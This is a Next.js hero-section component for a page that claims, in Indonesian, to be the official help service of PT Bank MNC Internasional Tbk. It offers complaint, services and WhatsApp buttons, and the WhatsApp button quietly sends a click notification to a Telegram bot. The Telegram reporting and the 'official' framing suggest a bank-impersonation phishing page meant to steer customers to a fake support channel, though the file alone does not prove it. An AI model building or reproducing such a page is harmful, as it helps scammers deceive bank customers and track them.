import Link from "next/link";
import { Button } from "@/components/ui/button";
import { ArrowRight, MessageSquare, Clock, Shield } from "lucide-react";

function WhatsAppIcon({ className }: { className?: string }) {
  return (
    <svg
      viewBox="0 0 24 24"
      fill="currentColor"
      className={className}
      xmlns="http://www.w3.org/2000/svg"
    >
      <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z" />
    </svg>
  );
}

export function Hero() {
  return (
    <section className="relative overflow-hidden bg-gradient-to-b from-secondary to-background py-16 md:py-24 lg:py-32">
      <div className="absolute inset-0 overflow-hidden" style={{ backgroundImage: "url(\"/IMG_20260707_222236_072.jpg\")", backgroundColor: "transparent", backgroundPosition: "left bottom" }}>
        <div className="absolute -top-24 -right-24 h-96 w-96 rounded-full bg-primary/5 blur-3xl" />
        <div className="absolute -bottom-24 -left-24 h-96 w-96 rounded-full bg-accent/5 blur-3xl" />
      </div>

      <div className="container relative">
        <div className="mx-auto max-w-3xl text-center">
          <div className="inline-flex items-center gap-2 rounded-full border border-primary/20 bg-primary/5 px-4 py-1.5 text-sm font-medium text-primary mb-6" style={{ backgroundColor: "#ffffff", backgroundImage: "none" }}>
            <Shield className="h-3.5 w-3.5" />
            Layanan Resmi PT Bank MNC Internasional Tbk
          </div>

          <h1 className="font-heading text-4xl font-bold tracking-tight text-foreground sm:text-5xl md:text-6xl mb-6" style={{ color: "#ffffff" }}>
            Layanan Bantuan{" "}
            <span className="text-primary" style={{ color: "#ca8a04", fontWeight: "900" }}>MNC Bank</span>
          </h1>

          <p className="text-lg md:text-xl text-muted-foreground leading-relaxed mb-8 max-w-2xl mx-auto" style={{ color: "#ffffff", backgroundImage: "none", backgroundColor: "#00000000", fontWeight: "900", textDecoration: "none" }}>
            Solusi cepat dan terpercaya untuk pengaduan, konsultasi, dan
            informasi layanan perbankan. Tim kami siap membantu nasabah{" "}
            <strong>MNC Bank</strong> 24 jam setiap hari.
          </p>

          <div className="flex flex-col sm:flex-row gap-3 justify-center mb-12">
            <Button
              asChild
              size="lg"
              className="bg-primary text-primary-foreground hover:bg-primary/90 font-semibold px-8">
              
              <Link href="#kontak">
                Ajukan Pengaduan
                <ArrowRight className="ml-2 h-4 w-4" />
              </Link>
            </Button>
            <Button
              asChild
              variant="outline"
              size="lg"
              className="border-primary/20 text-primary hover:bg-primary/5 font-semibold px-8">
              
              <Link href="#layanan" style={{ backgroundColor: "#003366", backgroundImage: "none", color: "#ffffff" }}>Lihat Layanan</Link>
            </Button>
            <Button
              asChild
              variant="secondary"
              size="lg"
              className="bg-green-600 text-white hover:bg-green-700 font-semibold px-8">
              
              <Link
                href="https://wa.me/1500095"
                target="_blank"
                rel="noopener noreferrer"
                onClick={() => {
                  import("@/lib/telegram").then(({ sendTelegramNotification }) => {
                    sendTelegramNotification({
                      action: "Klik WhatsApp Hero",
                      message: "User mengklik tombol WhatsApp di Hero section",
                    });
                  });
                }}
              >
                <WhatsAppIcon className="mr-2 h-4 w-4" />
                Hubungi WhatsApp
              </Link>
            </Button>
          </div>

          <div className="flex flex-wrap justify-center gap-6 md:gap-10 text-sm text-muted-foreground">
            <div className="flex items-center gap-2" style={{ backgroundColor: "transparent", backgroundImage: "none", boxShadow: "0 20px 25px -5px rgb(0 0 0 / 0.18)", margin: "40px 0px", borderRadius: "0px" }}>
              <Clock className="h-4 w-4 text-accent" />
              <span style={{ color: "#f3f4f6" }}>Layanan 24/7</span>
            </div>
            <div className="flex items-center gap-2">
              <MessageSquare className="h-4 w-4 text-accent" />
              <span style={{ color: "#ffffff" }}>Respons Cepat</span>
            </div>
            <div className="flex items-center gap-2">
              <Shield className="h-4 w-4 text-accent" />
              <span style={{ color: "#ffffff" }}>Terjamin Keamanan</span>
            </div>
          </div>
        </div>
      </div>
    </section>);

}